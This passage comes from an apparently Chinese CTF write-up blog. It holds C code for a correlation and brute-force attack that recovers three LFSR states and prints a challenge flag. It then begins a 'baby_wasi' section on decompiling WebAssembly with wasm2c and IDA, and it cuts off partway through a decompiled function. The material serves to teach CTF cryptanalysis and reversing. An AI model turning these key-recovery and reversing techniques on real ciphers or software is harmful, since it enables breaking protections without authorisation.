<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d %f&#34;</span><span class="p">,</span> <span class="n">possible_r2</span><span class="p">,</span> <span class="n">max_p</span><span class="p">);</span> <span class="c1">// 3324079    
</span><span class="c1"></span><span class="p">}</span>    
    
<span class="kt">void</span> <span class="nf">guess3</span><span class="p">(</span>    
<span class="p">)</span> <span class="p">{</span>    
<span class="kt">int</span> <span class="n">len</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>    
<span class="n">uint8_t</span> <span class="n">seq</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>    
    
<span class="kt">int</span> <span class="n">possible_r3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
<span class="kt">double</span> <span class="n">max_p</span> <span class="o">=</span> <span class="mf">0.0</span><span class="p">;</span>    
    
<span class="kt">int</span> <span class="n">r3</span><span class="p">;</span>    
<span class="k">for</span> <span class="p">(</span><span class="n">r3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">r3</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">23</span><span class="p">);</span> <span class="n">r3</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>    
    <span class="n">lfsr</span><span class="p">(</span><span class="n">r3</span><span class="p">,</span> <span class="mh">0x5E5E6A</span><span class="p">,</span> <span class="mh">0x7FFFFF</span><span class="p">,</span> <span class="n">seq</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>    
    
    <span class="kt">double</span> <span class="n">corr</span> <span class="o">=</span> <span class="n">correlation</span><span class="p">(</span><span class="n">seq</span><span class="p">,</span> <span class="n">mixed_output</span><span class="p">,</span> <span class="n">len</span><span class="p">);</span>    
    <span class="k">if</span> <span class="p">(</span><span class="n">corr</span> <span class="o">&gt;</span> <span class="n">max_p</span><span class="p">)</span> <span class="p">{</span>    
        <span class="n">possible_r3</span> <span class="o">=</span> <span class="n">r3</span><span class="p">;</span>    
        <span class="n">max_p</span> <span class="o">=</span> <span class="n">corr</span><span class="p">;</span>    
    <span class="p">}</span>    
<span class="p">}</span>    
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d %f&#34;</span><span class="p">,</span> <span class="n">possible_r3</span><span class="p">,</span> <span class="n">max_p</span><span class="p">);</span> <span class="c1">// 4958299    
</span><span class="c1"></span><span class="p">}</span>    
    
<span class="kt">void</span> <span class="nf">brute_force</span><span class="p">(</span>    
<span class="p">)</span> <span class="p">{</span>    
<span class="n">uint8_t</span> <span class="n">seq_r1</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="n">uint8_t</span> <span class="n">seq_r2</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>    
<span class="n">uint8_t</span> <span class="n">seq_r3</span><span class="p">[</span><span class="mi">100</span><span class="p">]</span> <span class="o">=</span> <span class="p">{};</span>    
    
<span class="kt">int</span> <span class="n">r2</span> <span class="o">=</span> <span class="mi">3324079</span><span class="p">;</span>    
<span class="kt">int</span> <span class="n">r3</span> <span class="o">=</span> <span class="mi">4958299</span><span class="p">;</span>    
    
<span class="n">lfsr</span><span class="p">(</span><span class="n">r2</span><span class="p">,</span> <span class="mh">0x2A9A0D</span><span class="p">,</span> <span class="mh">0x3FFFFF</span><span class="p">,</span> <span class="n">seq_r2</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>    
<span class="n">lfsr</span><span class="p">(</span><span class="n">r3</span><span class="p">,</span> <span class="mh">0x5E5E6A</span><span class="p">,</span> <span class="mh">0x7FFFFF</span><span class="p">,</span> <span class="n">seq_r3</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>    
    
<span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">r1</span> <span class="o">=</span> <span class="mi">1427994</span><span class="p">;</span> <span class="n">r1</span> <span class="o">&lt;</span> <span class="p">(</span><span class="mi">1</span><span class="o">&lt;&lt;</span><span class="mi">21</span><span class="p">);</span> <span class="n">r1</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>    
    <span class="n">lfsr</span><span class="p">(</span><span class="n">r1</span><span class="p">,</span> <span class="mh">0x17FA06</span><span class="p">,</span> <span class="mh">0x1FFFFF</span><span class="p">,</span> <span class="n">seq_r1</span><span class="p">,</span> <span class="mi">100</span><span class="p">);</span>    
    
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">100</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>    
        <span class="kt">int</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
    
        <span class="k">for</span><span class="p">(</span><span class="kt">int</span> <span class="n">bit</span> <span class="o">=</span> <span class="mi">7</span><span class="p">;</span> <span class="n">bit</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">bit</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>    
            <span class="kt">int</span> <span class="n">x1</span> <span class="o">=</span> <span class="p">(</span><span class="n">seq_r1</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="n">bit</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>    
            <span class="kt">int</span> <span class="n">x2</span> <span class="o">=</span> <span class="p">(</span><span class="n">seq_r2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="n">bit</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>    
            <span class="kt">int</span> <span class="n">x3</span> <span class="o">=</span> <span class="p">(</span><span class="n">seq_r3</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">&gt;&gt;</span><span class="n">bit</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">;</span>    
            <span class="n">byte</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="o">&lt;&lt;</span><span class="mi">1</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">x1</span><span class="o">*</span><span class="n">x3</span><span class="p">)</span><span class="o">^</span><span class="p">((</span><span class="n">x1</span><span class="o">^</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="n">x2</span><span class="p">));</span>    
        <span class="p">}</span>    
    
        <span class="k">if</span> <span class="p">(</span><span class="n">byte</span> <span class="o">!=</span> <span class="n">mixed_output</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="k">break</span><span class="p">;</span>    
        <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">==</span> <span class="mi">99</span><span class="p">)</span> <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%d&#34;</span><span class="p">,</span> <span class="n">r1</span><span class="p">);</span>  <span class="c1">// 1427994    
</span><span class="c1"></span>    <span class="p">}</span>    
<span class="p">}</span>    
<span class="p">}</span>    
    
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span>    
<span class="p">)</span> <span class="p">{</span>    
<span class="c1">// guess2();    
</span><span class="c1">// guess3();    
</span><span class="c1">// brute_force();    
</span><span class="c1"></span>    
<span class="kt">int</span> <span class="n">r1</span> <span class="o">=</span> <span class="mi">1427994</span><span class="p">;</span>    
<span class="kt">int</span> <span class="n">r2</span> <span class="o">=</span> <span class="mi">3324079</span><span class="p">;</span>    
<span class="kt">int</span> <span class="n">r3</span> <span class="o">=</span> <span class="mi">4958299</span><span class="p">;</span>    
<span class="n">printf</span><span class="p">(</span><span class="s">&#34;%x%x%x&#34;</span><span class="p">,</span> <span class="n">r1</span><span class="p">,</span> <span class="n">r2</span><span class="p">,</span> <span class="n">r3</span><span class="p">);</span> <span class="c1">// flag{15ca1a32b8af4ba85b}    
</span><span class="c1"></span><span class="p">}</span>    
</code></pre></td></tr></table>
</div>
</div><p>关于LFSR的一些资料   <br>
<a href="https://blog.csdn.net/ACdreamers/article/details/44656743" target="_blank" rel="noopener noreffer">线性反馈移位寄存器与梅森旋转算法</a>   <br>
<a href="https://www.anquanke.com/post/id/181811" target="_blank" rel="noopener noreffer">深入分析CTF中的LFSR类题目(一)</a>   <br>
<a href="https://www.anquanke.com/post/id/184828" target="_blank" rel="noopener noreffer">深入分析CTF中的LFSR类题目(二)</a></p>
<h2 id="baby_wasi">baby_wasi</h2>
<p>趁着这道题好好学习了一下wasm,感觉收获还挺多的(Helica tql tql tql)</p>
<h3 id="反编译wasm">反编译wasm</h3>
<p>这道题用了wasmer-c-api来构建,主程序为baby_wasi,program.wasm为子程序,主要处理字符串变换逻辑.首先对program.wasm逆向分析.基础教程:   <br>
<a href="https://xz.aliyun.com/t/5170" target="_blank" rel="noopener noreffer">一种Wasm逆向静态分析方法</a>   <br>
反汇编的话，可以用<code>wasm2wat</code>把wasm反汇编成wat，https://developer.mozilla.org/zh-CN/docs/WebAssembly/Understanding_the_text_format 这里面对wat进行了一些解释   <br>
还可以把wasm转成c语言的格式，用<code>wasm2c</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">$ ./wasm2c wasm.wasm -o wasm.c    
<span class="o">==</span>&gt; 得到wasm.c和wasm.h    
</code></pre></td></tr></table>
</div>
</div><p>但是因为生成的c语言很长而且基本跟看wat没什么区别，所以需要再编译成二进制文件放到ida里面去看   <br>
将之前反编译出来的wasm.c，wasm.h，以及wabt项目内的wasm-rt.h，wasm-rt-impl.c，wasm-rt-impl.h三个文件放到同一个文件夹。   <br>
直接gcc wasm.c会报错，因为很多wasm的函数没有具体的实现。但是我们可以只编译不链接，我们关心的只是程序本身的逻辑，不需要真正编译出能运行的elf来。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-shell" data-lang="shell">$ gcc -c wasm.c -o wasm.o    
</code></pre></td></tr></table>
</div>
</div><p>得到的还未连接的elf文件wasm.o, 将wasm.o放到ida里面分析会比较清楚一些。</p>
<h3 id="查找main函数">查找main函数</h3>
<p>从反编译的代码里面可以看到有_start函数,然后需要从这一堆函数里面找到关键函数&hellip;对于wasm，所有的字符串会被存放在二进制文件的末尾，而且wasm并不是直接对地址的引用，想找到这些字符串会比较困难。Nu1L的wp里面说识别出来malloc,free,exit这些函数然后才推测出来main函数的位置,我在谷歌上找到了一份保留函数名称的代码，可以对照着识别出来main函数，函数如下:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-cpp" data-lang="cpp"><span class="k">static</span> <span class="kt">void</span> <span class="nf">_start</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>    
<span class="n">u32</span> <span class="n">l0</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">l1</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">l2</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">l3</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>    
<span class="n">FUNC_PROLOGUE</span><span class="p">;</span>    
<span class="n">u32</span> <span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">,</span> <span class="n">i2</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">g0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">16u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">-=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">l0</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">g0</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">__wasilibc_init_preopen</span><span class="p">();</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="mi">3u</span><span class="p">;</span>    
<span class="n">l1</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="nl">L1</span><span class="p">:</span>     
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">Z_wasi_unstableZ_fd_prestat_getZ_iii</span><span class="p">)(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">);</span>    
<span class="n">l2</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">8u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i0</span> <span class="o">&gt;</span> <span class="n">i1</span><span class="p">;</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B0</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="k">switch</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span>    
  <span class="k">case</span> <span class="mi">0</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B3</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">2</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">3</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">4</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">5</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">6</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">7</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
  <span class="k">case</span> <span class="mi">8</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B2</span><span class="p">;</span>    
  <span class="k">default</span><span class="o">:</span> <span class="k">goto</span> <span class="n">B3</span><span class="p">;</span>    
<span class="p">}</span>    
<span class="nl">B3</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load8_u</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span><span class="p">));</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B4</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">1u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">+=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">l2</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B0</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">i2</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i2</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i2</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">Z_wasi_unstableZ_fd_prestat_dir_nameZ_iiii</span><span class="p">)(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">,</span> <span class="n">i2</span><span class="p">);</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B5</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">free</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">goto</span> <span class="n">B0</span><span class="p">;</span>    
<span class="nl">B5</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i1</span> <span class="o">+</span> <span class="mi">4</span><span class="p">));</span>    
<span class="n">i0</span> <span class="o">+=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>    
<span class="n">i32_store8</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span><span class="p">),</span> <span class="n">i1</span><span class="p">);</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">__wasilibc_register_preopened_fd</span><span class="p">(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">);</span>    
<span class="n">l3</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">free</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l3</span><span class="p">;</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B0</span><span class="p">;}</span>    
<span class="nl">B4</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="mi">1u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">+=</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">l2</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l1</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i0</span> <span class="o">&lt;</span> <span class="n">i1</span><span class="p">;</span>    
<span class="n">l3</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">l1</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l3</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">L1</span><span class="p">;}</span>    
<span class="nl">B2</span><span class="p">:;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i2</span> <span class="o">=</span> <span class="mi">12u</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">+=</span> <span class="n">i2</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">Z_wasi_unstableZ_environ_sizes_getZ_iii</span><span class="p">)(</span><span class="n">i0</span><span class="p">,</span> <span class="n">i1</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B8</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i1</span><span class="p">));</span>    
<span class="n">i2</span> <span class="o">=</span> <span class="mi">2u</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">&lt;&lt;=</span> <span class="p">(</span><span class="n">i2</span> <span class="o">&amp;</span> <span class="mi">31</span><span class="p">);</span>    
<span class="n">i2</span> <span class="o">=</span> <span class="mi">4u</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">+=</span> <span class="n">i2</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">i1</span><span class="p">);</span>    
<span class="n">i32_store</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span> <span class="o">+</span> <span class="mi">1528</span><span class="p">),</span> <span class="n">i1</span><span class="p">);</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span> <span class="o">+</span> <span class="mi">12</span><span class="p">));</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="n">l1</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B8</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="mi">0u</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">i32_load</span><span class="p">((</span><span class="o">&amp;</span><span class="n">memory</span><span class="p">),</span> <span class="p">(</span><span class="n">u64</span><span class="p">)(</span><span class="n">i0</span> <span class="o">+</span> <span class="mi">1528</span><span class="p">));</span>    
<span class="n">l2</span> <span class="o">=</span> <span class="n">i0</span><span class="p">;</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="o">!</span><span class="p">(</span><span class="n">i0</span><span class="p">);</span>    
<span class="k">if</span> <span class="p">(</span><span class="n">i0</span><span class="p">)</span> <span class="p">{</span><span class="k">goto</span> <span class="n">B8</span><span class="p">;}</span>    
<span class="n">i0</span> <span class="o">=</span> <span class="n">l2</span><span class="p">;</span>    
<span class="n">i1</span> <span class="o">=</span> <span class="n">l0</span><span class="p">;</span>    
